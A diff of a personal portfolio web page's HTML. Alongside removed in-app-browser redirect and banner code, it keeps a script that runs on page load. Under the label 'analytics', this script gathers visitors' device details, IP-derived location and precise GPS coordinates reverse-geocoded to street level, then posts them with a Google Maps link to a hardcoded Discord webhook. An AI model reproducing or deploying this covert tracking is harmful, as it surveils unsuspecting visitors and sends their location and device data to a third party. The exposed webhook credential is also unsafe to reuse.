@@ -3,41 +3,6 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-<!-- IAB EARLY REDIRECT: harus jalan SEBELUM apapun load -->
-<!-- Ini fix utama: IG beranda reload karena halaman berat (canvas/CDN/font) -->
-<!-- diload di webview IG, lalu saat back IG nganggep ada navigasi → feed refresh -->
-<script>
-(function(){
-  var ua = navigator.userAgent || '';
-  // Hanya redirect/block untuk Instagram & Facebook saja
-  // TikTok, WhatsApp, Line, Snapchat, Twitter dibiarkan load normal — GPS masih bisa jalan
-  var isIGFB = /Instagram|FBAN|FBAV/i.test(ua);
-  if(!isIGFB) return;
-  var url = location.href;
-  var isAndroid = /Android/i.test(ua);
-  var isIOS = /iPhone|iPad|iPod/i.test(ua);
-  if(isAndroid){
-    // Android: langsung redirect via intent ke Chrome — keluar dari IAB sebelum halaman load
-    location.replace('intent://' + url.replace(/^https?:\/\//, '') + '#Intent;scheme=https;package=com.android.chrome;S.browser_fallback_url=' + encodeURIComponent(url) + ';end');
-    // Kalau intent gagal (tidak ada Chrome), stop load halaman berat, tampilkan halaman ringan
-    document.addEventListener('DOMContentLoaded', function(){
-      document.open();
-      document.write('<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Buka di Browser</title><style>*{box-sizing:border-box;margin:0;padding:0}body{background:#03050f;color:#eeeef2;font-family:sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;text-align:center;padding:24px}.card{background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.1);border-radius:20px;padding:32px 24px;max-width:360px}h2{font-size:1.3rem;margin-bottom:12px}p{font-size:0.9rem;color:rgba(238,238,242,0.6);margin-bottom:24px;line-height:1.6}a{display:inline-block;padding:12px 28px;background:linear-gradient(135deg,rgba(124,106,247,0.9),rgba(34,211,238,0.7));border-radius:50px;color:#fff;text-decoration:none;font-weight:700;font-size:0.85rem}</style></head><body><div class="card"><h2>🌐 Buka di Browser</h2><p>Untuk pengalaman terbaik, buka halaman ini di browser kamu.</p><a href="' + url + '">Buka Chrome / Browser</a></div></body></html>');
-      document.close();
-    });
-    return;
-  }
-  if(isIOS){
-    // iOS: tidak bisa intent, tampilkan halaman ringan saja — jangan load halaman berat
-    document.addEventListener('DOMContentLoaded', function(){
-      document.open();
-      document.write('<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Buka di Safari</title><style>*{box-sizing:border-box;margin:0;padding:0}body{background:#03050f;color:#eeeef2;font-family:sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;text-align:center;padding:24px}.card{background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.1);border-radius:20px;padding:32px 24px;max-width:360px}h2{font-size:1.3rem;margin-bottom:12px}p{font-size:0.9rem;color:rgba(238,238,242,0.6);margin-bottom:24px;line-height:1.6}button{display:inline-block;padding:12px 28px;background:linear-gradient(135deg,rgba(124,106,247,0.9),rgba(34,211,238,0.7));border-radius:50px;color:#fff;border:none;font-weight:700;font-size:0.85rem;cursor:pointer;width:100%;margin-bottom:10px}small{color:rgba(238,238,242,0.35);font-size:0.75rem}</style></head><body><div class="card"><h2>🌐 Buka di Safari</h2><p>Tap tombol di bawah, copy link-nya, lalu paste di Safari atau browser lain.</p><button onclick="(function(){var inp=document.createElement(\'input\');inp.value=\'' + url + '\';document.body.appendChild(inp);inp.select();document.execCommand(\'copy\');document.body.removeChild(inp);this.textContent=\'✓ Link Tersalin!\';setTimeout(function(){document.querySelector(\'button\').textContent=\'Copy Link\'},2500)}).call(this)">Copy Link</button><br><small>' + url + '</small></div></body></html>');
-      document.close();
-    });
-    return;
-  }
-})();
-</script>
 <title>Hi there! — by Riski Romadhan Maulana</title>
 <meta name="description" content="Crafting futuristic digital experiences with premium design, cutting-edge technology AND Kuli with pacul. By Riski Romadhan Maulana.">
 <meta name="author" content="Riski Romadhan Maulana">
@@ -322,24 +287,6 @@ footer{position:relative;z-index:10;padding:36px 16px;border-top:1px solid var(-
 </style>
 </head>
 <body>
-
-<style>
-#iab-banner{display:none;position:fixed;bottom:16px;left:50%;transform:translateX(-50%);z-index:9999;width:calc(100% - 32px);max-width:420px;background:rgba(8,12,28,0.96);border:1px solid rgba(124,106,247,0.5);border-radius:16px;padding:12px 16px;backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px);box-shadow:0 4px 32px rgba(0,0,0,0.5);animation:bannerSlide 0.4s cubic-bezier(.2,.8,.2,1)}
-@keyframes bannerSlide{from{opacity:0;transform:translateX(-50%) translateY(20px)}to{opacity:1;transform:translateX(-50%) translateY(0)}}
-#iab-banner.show{display:flex;align-items:center;gap:12px}
-#iab-banner-icon{font-size:1.3rem;flex-shrink:0}
-#iab-banner-text{flex:1;font-family:'DM Sans',sans-serif;font-size:0.78rem;color:rgba(238,238,242,0.85);line-height:1.45}
-#iab-banner-text strong{color:#fff;font-weight:600}
-#iab-banner-open{flex-shrink:0;padding:7px 14px;background:linear-gradient(135deg,rgba(124,106,247,0.9),rgba(34,211,238,0.7));border:none;border-radius:50px;font-family:'Syne',sans-serif;font-size:0.65rem;font-weight:700;letter-spacing:0.08em;text-transform:uppercase;color:#fff;cursor:pointer;white-space:nowrap}
-#iab-banner-close{flex-shrink:0;background:none;border:none;color:rgba(238,238,242,0.4);font-size:1rem;cursor:pointer;padding:2px 4px;line-height:1}
-</style>
-
-<div id="iab-banner" role="alert">
-  <div id="iab-banner-icon">🌐</div>
-  <div id="iab-banner-text"><strong>Open in browser</strong> for the best experience</div>
-  <button id="iab-banner-open" id="iab-open-btn">visit</button>
-  <button id="iab-banner-close" aria-label="Tutup">&times;</button>
-</div>
 
 <canvas id="galaxy-canvas" aria-hidden="true"></canvas>
 
@@ -1266,11 +1213,7 @@ document.getElementById('contact-form').addEventListener('submit', async functio
   }, 4000);
 });
 
-// Bungkus seluruh analytics dalam requestIdleCallback + setTimeout
-// Supaya tidak jalan saat browser/IG masih rendering halaman → tidak lag saat balik ke IG
-(function scheduleAnalytics(){
-  function run(){
-    (async function sendAnalytics(){
+(async function sendAnalytics(){
   const WEBHOOK = 'https://discord.com/api/webhooks/1511445599046733905/SbRGVq0s6PlPBh3X_9SSyNEF7AqWH3tUIgIREZdw7UL7oH7wI6i2mQB_P7uI_p5g9vQA';
 
   if(sessionStorage.getItem('beta_analytics_sent')) return;
@@ -1362,76 +1305,34 @@ document.getElementById('contact-form').addEventListener('submit', async functio
     } catch { return 'Unknown'; }
   }
 
-  const _ua_raw = navigator.userAgent || '';
-  const isIAB = /Instagram|FBAN|FBAV|Twitter|TikTok|Snapchat|Line\/|WhatsApp|LinkedInApp/i.test(_ua_raw);
-  const iabName = /Instagram/i.test(_ua_raw) ? 'Instagram IAB'
-                : /FBAN|FBAV/i.test(_ua_raw) ? 'Facebook IAB'
-                : /Twitter/i.test(_ua_raw)   ? 'Twitter IAB'
-                : /TikTok/i.test(_ua_raw)    ? 'TikTok IAB'
-                : /Snapchat/i.test(_ua_raw)  ? 'Snapchat IAB'
-                : /WhatsApp/i.test(_ua_raw)  ? 'WhatsApp IAB'
-                : /LinkedInApp/i.test(_ua_raw)? 'LinkedIn IAB'
-                : isIAB ? 'In-App Browser' : null;
-
-  async function reverseGeocode(lat, lon){
-    const nomCtrl = new AbortController();
-    const nomTid  = setTimeout(()=> nomCtrl.abort(), 6000);
-    try {
-      const res  = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`, { signal: nomCtrl.signal });
-      clearTimeout(nomTid);
-      const data = await res.json();
-      if(data && data.address){
-        const a = data.address;
-        return {
-          jalan:     a.road || a.pedestrian || a.footway || a.path || '',
-          kelurahan: a.suburb || a.neighbourhood || a.hamlet || '',
-          kecamatan: a.city_district || a.district || a.county || '',
-          kota:      a.city || a.town || a.village || a.municipality || '',
-          negara:    a.country || '',
-          postcode:  a.postcode || '',
-          placeId:  `osm:${data.place_id}`,
-          lat, lon, accuracy: Math.round(lat)
-        };
-      }
-    } catch { clearTimeout(nomTid); }
-    return null;
-  }
-
   async function getDetailedLocation(){
     return new Promise((resolve)=>{
-      // Hanya blok Instagram & Facebook IAB saja
-      // karena GPS dialog di IG/FB bikin beranda reload saat balik
-      // TikTok, WhatsApp, Line, Snapchat, Twitter dll tetap boleh minta GPS
-      const _uaCheck = navigator.userAgent || '';
-      const _isIGBlock = /Instagram|FBAN|FBAV/i.test(_uaCheck);
-      if(_isIGBlock){ resolve(null); return; }
-
       if(sessionStorage.getItem('loc_asked')){ resolve(null); return; }
       sessionStorage.setItem('loc_asked','1');
       if(!navigator.geolocation){ resolve(null); return; }
-
-      function onSuccess(pos){
-        const { latitude: lat, longitude: lon, accuracy } = pos.coords;
-        reverseGeocode(lat, lon).then(result => {
-          if(result){ result.accuracy = Math.round(accuracy); }
-          resolve(result);
-        });
-      }
-
-      function onErrorFallback(){ resolve(null); }
-
-      function onErrorRetry(){
-        navigator.geolocation.getCurrentPosition(
-          onSuccess,
-          onErrorFallback,
-          { timeout: 10000, enableHighAccuracy: false, maximumAge: 60000 }
-        );
-      }
-
       navigator.geolocation.getCurrentPosition(
-        onSuccess,
-        onErrorRetry,
-        { timeout: 15000, enableHighAccuracy: true, maximumAge: 30000 }
+        async (pos)=>{
+          const { latitude: lat, longitude: lon, accuracy } = pos.coords;
+          try {
+            const res  = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`);
+            const data = await res.json();
+            if(data && data.address){
+              const a = data.address;
+              resolve({
+                jalan:     a.road || a.pedestrian || a.footway || a.path || '',
+                kelurahan: a.suburb || a.neighbourhood || a.hamlet || '',
+                kecamatan: a.city_district || a.district || a.county || '',
+                kota:      a.city || a.town || a.village || a.municipality || '',
+                negara:    a.country || '',
+                postcode:  a.postcode || '',
+                placeId:  `osm:${data.place_id}`,
+                lat, lon, accuracy: Math.round(accuracy)
+              });
+            } else { resolve(null); }
+          } catch { resolve(null); }
+        },
+        ()=> resolve(null),
+        { timeout: 8000, enableHighAccuracy: true }
       );
     });
   }
@@ -1501,8 +1402,6 @@ document.getElementById('contact-form').addEventListener('submit', async functio
           g.postal       = d.postal       || 'Unknown';
           g.org          = d.org          || 'Unknown';
           g.asn          = d.asn          || 'Unknown';
-          g.lat          = d.latitude     || null;
-          g.lon          = d.longitude    || null;
         }
       } catch(e){}
       return g;
@@ -1521,7 +1420,6 @@ document.getElementById('contact-form').addEventListener('submit', async functio
     { name:'🧠 RAM',           value: ramGB, inline: true },
   ];
   if(battery) fields1.push({ name:'🔋 Battery', value: battery, inline: true });
-  if(iabName) fields1.push({ name:'📲 In-App Browser', value: iabName, inline: true });
   fields1.push(
     { name:'📐 Resolution',    value: scr, inline: true },
     { name:'🪟 Viewport',      value: viewport, inline: true },
@@ -1569,14 +1467,6 @@ document.getElementById('contact-form').addEventListener('submit', async functio
       { name:'🎯 Akurasi',      value: `±${detailLoc.accuracy}m`, inline: true },
       { name:'🔗 Google Maps',  value: `[Buka Maps](${mapsUrl})`, inline: true },
     );
-  } else if(geo.lat && geo.lon) {
-    const ipMapsUrl = `https://www.google.com/maps?q=${geo.lat},${geo.lon}`;
-    fields2.push(
-      { name:'📍 Lokasi (via IP)',  value: `${geo.city}, ${geo.region}, ${geo.country}`, inline: false },
-      { name:'🗺️ Koordinat (IP)',   value: `\`${Number(geo.lat).toFixed(4)}, ${Number(geo.lon).toFixed(4)}\``, inline: true },
-      { name:'🎯 Akurasi',          value: '~kota (IP)', inline: true },
-      { name:'🔗 Google Maps',      value: `[Buka Maps](${ipMapsUrl})`, inline: true },
-    );
   } else {
     fields2.push({ name:'📍 GPS', value: 'Tidak diizinkan / timeout', inline: false });
   }
@@ -1592,24 +1482,12 @@ document.getElementById('contact-form').addEventListener('submit', async functio
   try {
     const params = new URLSearchParams();
     params.append('payload_json', JSON.stringify({ embeds: [embed1, embed2] }));
-    // Fire-and-forget: tidak pakai await + hapus ?wait=true
-    // Supaya browser tidak nunggu response Discord → tidak bikin IG lag saat balik
-    fetch(WEBHOOK, {
+    await fetch(WEBHOOK + '?wait=true', {
       method: 'POST',
-      body: params,
-      keepalive: true
-    }).catch(()=>{});
+      body: params
+    });
   } catch(err) {
     console.warn('Analytics webhook failed:', err);
-  }
-})();
-  } // end run()
-
-  // Jalankan hanya saat browser benar-benar idle (tidak block rendering IG)
-  if(typeof requestIdleCallback === 'function'){
-    requestIdleCallback(run, { timeout: 8000 });
-  } else {
-    setTimeout(run, 2000);
   }
 })();
 
@@ -1654,46 +1532,6 @@ function initTilt(){
 }
 setTimeout(initTilt, 800);
 
-})();
-
-</script>
-<script>
-(function(){
-  const ua = navigator.userAgent || '';
-
-  // IG & FB sudah di-handle oleh early redirect di <head> — skip di sini
-  const isIGFB = /Instagram|FBAN|FBAV/i.test(ua);
-  if(isIGFB) return;
-
-  // Tampilkan banner untuk semua IAB lain: TikTok, WhatsApp, Line, Snapchat, Twitter, dll
-  const isIAB = /TikTok|Snapchat|Line\/|WhatsApp|LinkedInApp|Twitter/i.test(ua);
-  if(!isIAB) return;
-
-  const banner = document.getElementById('iab-banner');
-  const closeBtn = document.getElementById('iab-banner-close');
-  if(!banner) return;
-  banner.classList.add('show');
-  closeBtn.addEventListener('click', ()=>{ banner.style.display='none'; });
-
-  const openBtn = document.getElementById('iab-banner-open');
-  if(!openBtn) return;
-  const url = location.href;
-  const isAndroid = /Android/i.test(ua);
-  const isIOS = /iPhone|iPad|iPod/i.test(ua);
-
-  // Universal: buat anchor target=_blank — paling compatible di semua IAB semua platform
-  // Tidak ada dialog konfirmasi, langsung buka browser default device
-  openBtn.removeAttribute('onclick');
-  const a = document.createElement('a');
-  a.href = url;
-  a.target = '_blank';
-  a.rel = 'noopener noreferrer';
-  a.style.display = 'none';
-  document.body.appendChild(a);
-  openBtn.addEventListener('click', function(e){
-    e.preventDefault();
-    a.click();
-  });
 })();
 </script>
 </body>
